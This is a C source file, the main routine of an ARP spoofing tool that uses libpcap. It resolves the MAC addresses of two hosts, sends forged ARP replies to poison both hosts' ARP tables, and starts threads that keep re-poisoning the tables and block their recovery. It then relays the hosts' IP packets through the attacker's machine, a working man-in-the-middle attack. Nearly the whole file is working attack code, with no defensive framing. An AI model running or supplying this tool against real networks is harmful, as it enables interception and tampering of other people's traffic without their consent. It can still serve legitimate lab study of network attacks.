#include "arp_spoof.h"

int main(int argc, char *argv[])
{
	if (argc != 4)
	{
	    usage();
		return -1;
	}
	
	puts("[+] Running program...\n");

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "[-] Couldn't open device %s: %s\n", argv[1], errbuf);
		return -1;
	}

	char                my_IP_char[16];
	struct in_addr     *my_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t            my_IP;
	uint8_t            *my_mac = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	struct in_addr     *sender_IP_struct = (struct in_addr *)calloc(1, sizeof(struct in_addr));
	uint32_t            sender_IP;
	uint8_t            *sender_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	struct in_addr     *target_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t            target_IP;
	uint8_t            *target_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));	

    eth_header *request_arp = (eth_header *)calloc(1, sizeof(eth_header));
	eth_header *reply_sender = (eth_header *)calloc(1, sizeof(eth_header));
	eth_header *reply_target = (eth_header *)calloc(1, sizeof(eth_header));

	struct pcap_pkthdr *header = (struct pcap_pkthdr *)calloc(1, sizeof(struct pcap_pkthdr));
	const uint8_t      *packet;

	arguments *info = (arguments *)calloc(1, sizeof(arguments));

	time_t start;

/* get attacker ip address */
	get_ip(my_IP_char, argv[1]);
	inet_aton(my_IP_char, my_IP_struct);
	my_IP = my_IP_struct->s_addr;
	printf("[Attacker IP  Address] "); print_ip(my_IP_char); puts("");

/* get attacker mac address */
	get_mac(my_mac, argv[1]);
	printf("[Attacker MAC Address] "); print_mac(my_mac); puts("\n");

	inet_aton(argv[2], sender_IP_struct);
	sender_IP = sender_IP_struct->s_addr;
	printf("[Sender IP Address] %s", argv[2]); puts("");

	arp_request(request_arp, my_mac, my_IP, sender_IP);
	start = time(NULL);
	while(1)
	{
		if (time(NULL) > start + 5)
		{
			puts("Fail to get Sender MAC Address");
			exit(EXIT_FAILURE);
		}
		if (pcap_sendpacket(handle, (uint8_t *)request_arp, sizeof(eth_header))) 
            pcap_perror(handle, (char *)"pcap_sendpacket error"); 
		if (get_sendermac(sender_MAC_array, sender_IP, handle, header, packet)) 
            break; 
	}
	printf("[Sender MAC Address] "); print_mac(sender_MAC_array); puts("\n");

	inet_aton(argv[3], target_IP_struct);
	target_IP = target_IP_struct->s_addr;
	printf("[Target IP  Address] %s", argv[3]); puts("");

	arp_request(request_arp, my_mac, my_IP, target_IP);
	start = time(NULL);
	while(1)
	{
		if (time(NULL) > start + 5)
		{
			puts("Fail to get Sender MAC Address");
			exit(EXIT_FAILURE);
		}
		if (pcap_sendpacket(handle, (uint8_t *)request_arp, sizeof(eth_header))) 
            pcap_perror(handle, (char *)"pcap_sendpacket error");
		if (get_sendermac(target_MAC_array, target_IP, handle, header, packet)) 
            break; 
	}
	printf("[Target MAC Address] "); 
    print_mac(target_MAC_array); 
    puts("\n");

	puts("[+] Retrieved all required information!\n");

	arp_reply(reply_sender, my_mac, sender_MAC_array, sender_IP, target_IP);
	arp_reply(reply_target, my_mac, target_MAC_array, target_IP, sender_IP);
	puts("[+] Built ARP packets\n");

	if (pcap_sendpacket(handle, (uint8_t *)reply_sender, sizeof(eth_header))) { pcap_perror(handle, (char *)"[- INIT -] pcap_sendpacket error"); }
	else { puts("[  INIT  ] sender <- attacker    target"); }
	if (pcap_sendpacket(handle, (uint8_t *)reply_target, sizeof(eth_header))) { pcap_perror(handle, (char *)"[- INIT -] pcap_sendpacket error"); }
	else { puts("[  INIT  ] sender    attacker -> target"); }
	puts(""); 

	puts("[+] Sent initial fake ARP packets to poison sender and target's ARP table for the first time\n");


	pthread_t tid1, tid2;

	strcpy(info->dev, argv[1]);
	info->sender_IP = sender_IP;
	info->target_IP = target_IP;
	memcpy(info->reply_sender, (uint8_t *)reply_sender, sizeof(eth_header));
	memcpy(info->reply_target, (uint8_t *)reply_target, sizeof(eth_header));

// Extra level of assurance
	pthread_create(&tid1, NULL, arp_send, (void *)info);
	printf("[+] Initiated thread, periodically (%ds) poisoning arp table\n\n", SEND_ARP_PERIOD);

	pthread_create(&tid2, NULL, block, (void *)info);
	puts("[+] Initiated thread, blocking arp table recovery\n");
	puts("[+] Displaying network traffic...\n");

// Relay packets
	while (1)
	{	
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0)               { continue; }
		if (res == -1 || res == -2) { return 0; }

		uint8_t *n_packet = (uint8_t *)calloc(1, header->caplen);
		memcpy(n_packet, packet, header->caplen);
	
		int mcnt1 = 0;
		int mcnt2 = 0;

		bool smac1_ok = 0;
		bool smac2_ok = 0;

		bool dmac_ok = 0;

		bool dip_ok = 0;

		for (int i = 0; i < 6; i++)
		{
			if (((eth_header *)n_packet)->SMAC[i] == sender_MAC_array[i]) { mcnt1++; }
			if (((eth_header *)n_packet)->SMAC[i] == target_MAC_array[i]) { mcnt2++; }
		}

		if (mcnt1 == 6) { smac1_ok = 1; }
		if (mcnt2 == 6) { smac2_ok = 1; }

		mcnt1 = 0;
		mcnt2 = 0;

		for (int i = 0; i < 6; i++)
		{
			if (((eth_header *)n_packet)->DMAC[i] == my_mac[i]) { mcnt1++; }
		}

		if (mcnt1 == 6) { dmac_ok = 1; }

		if (dmac_ok)
		{
			uint16_t PCKT_ETHERTYPE = ntohs(((eth_header *)n_packet)->ETHTYPE);
			if (PCKT_ETHERTYPE == ETHERTYPE_IP)
			{
				if (((((struct libnet_ipv4_hdr *)(n_packet + sizeof(struct libnet_ethernet_hdr)))->ip_dst).s_addr) != my_IP)
				{
					dip_ok = 1; 
				}
			}
		}

		if (smac1_ok && dmac_ok && dip_ok)
		{
			// Relay IP packets
			memcpy(((eth_header *)n_packet)->DMAC, target_MAC_array, 6 * sizeof(uint8_t));
			memcpy(((eth_header *)n_packet)->SMAC, my_mac, 6 * sizeof(uint8_t));
			if (pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen)) { pcap_perror(handle, (char *)"[- RLAY -] pcap_sendpacket error"); }
			else { puts("[  RLAY  ] sender -> attacker -> target"); }
		}

		if (smac2_ok && dmac_ok && dip_ok)
		{
			// Relay IP packets
			memcpy(((eth_header *)n_packet)->DMAC, sender_MAC_array, 6 * sizeof(uint8_t));
			memcpy(((eth_header *)n_packet)->SMAC, my_mac, 6 * sizeof(uint8_t));
			if (pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen)) { pcap_perror(handle, (char *)"[- RLAY -] pcap_sendpacket error"); }
			else { puts("[  RLAY  ] sender <- attacker <- target"); }
		}

		free(n_packet);
	}

	pthread_join(tid1, NULL);
	pthread_join(tid2, NULL);
	
	pcap_close(handle);
	free(info);
	free(my_IP_struct); free(my_mac);
	free(sender_IP_struct);   free(sender_MAC_array);
	free(target_IP_struct);   free(target_MAC_array);
	free(header);             free(request_arp);
	free(reply_sender);   free(reply_target);

	return 0;
}